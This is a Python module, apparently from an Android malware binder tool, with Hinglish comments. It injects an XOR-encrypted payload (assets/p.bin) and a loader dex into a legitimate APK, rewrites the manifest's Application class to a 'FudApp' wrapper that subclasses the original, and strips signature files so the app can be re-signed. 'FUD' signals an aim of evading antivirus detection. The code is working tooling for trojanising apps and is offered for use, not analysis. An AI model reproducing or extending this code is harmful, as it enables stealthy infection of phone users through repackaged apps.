"""
Class2.dex (Loader+FudApp) + assets/p.bin inject karta hai.
Native lib NAHI — pure Java XOR decrypt.
"""
import os
import shutil
import zipfile
import xml.etree.ElementTree as ET
from config import LOADER_SRC_DIR, LOADER_DEX
from setup import _compile_dex, _FUD_APP_TEMPLATE

ANDROID_NS = "http://schemas.android.com/apk/res/android"
ET.register_namespace("android", ANDROID_NS)


def _read_app_class(decompiled_dir: str) -> str:
    path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    root = ET.parse(path).getroot()
    app = root.find("application")
    if app is None:
        return "android.app.Application"
    name = app.get(f"{{{ANDROID_NS}}}name")
    if not name:
        return "android.app.Application"
    if name.startswith("."):
        return (root.get("package") or "") + name
    return name


def _patch_manifest(decompiled_dir: str):
    path = os.path.join(decompiled_dir, "AndroidManifest.xml")
    tree = ET.parse(path)
    root = tree.getroot()
    app = root.find("application")
    if app is None:
        app = ET.SubElement(root, "application")
    app.set(f"{{{ANDROID_NS}}}name", "com.system.fud.FudApp")
    tree.write(path, encoding="utf-8", xml_declaration=True)
    print("[✓] manifest → com.system.fud.FudApp")


def _build_fud_app_dex(original_class: str, out_dex: str):
    """FudApp per-APK compile. Loader + FudApp together."""
    src_dir = LOADER_SRC_DIR + "_app"
    if os.path.exists(src_dir):
        shutil.rmtree(src_dir)
    os.makedirs(src_dir, exist_ok=True)

    # copy cached Loader.java
    shutil.copy2(os.path.join(LOADER_SRC_DIR, "Loader.java"),
                 os.path.join(src_dir, "Loader.java"))

    with open(os.path.join(src_dir, "FudApp.java"), "w") as f:
        f.write(_FUD_APP_TEMPLATE.replace("{SUPER}", original_class))

    _compile_dex(src_dir, out_dex)


def _add_to_apk(apk_path: str, payload_bin: str, loader_dex: str):
    tmp = apk_path + ".tmp"
    with zipfile.ZipFile(apk_path, "r") as zin, \
         zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            fn = item.filename
            if fn.startswith("META-INF/"):
                continue
            if fn == "classes2.dex" or fn == "assets/p.bin":
                continue
            zout.writestr(item, zin.read(fn))

        with open(loader_dex, "rb") as f:
            zout.writestr("classes2.dex", f.read(), compress_type=zipfile.ZIP_STORED)
        with open(payload_bin, "rb") as f:
            zout.writestr("assets/p.bin", f.read(), compress_type=zipfile.ZIP_STORED)

    shutil.move(tmp, apk_path)


def inject_payload(decompiled_dir: str, recompiled_apk: str,
                   payload_bin: str, work_dir: str):
    original_class = _read_app_class(decompiled_dir)
    print(f"[*] original Application: {original_class}")

    fud_app_dex = os.path.join(work_dir, "fudapp.dex")
    _build_fud_app_dex(original_class, fud_app_dex)
    _patch_manifest(decompiled_dir)
    _add_to_apk(recompiled_apk, payload_bin, fud_app_dex)
    print("[✓] payload injected")
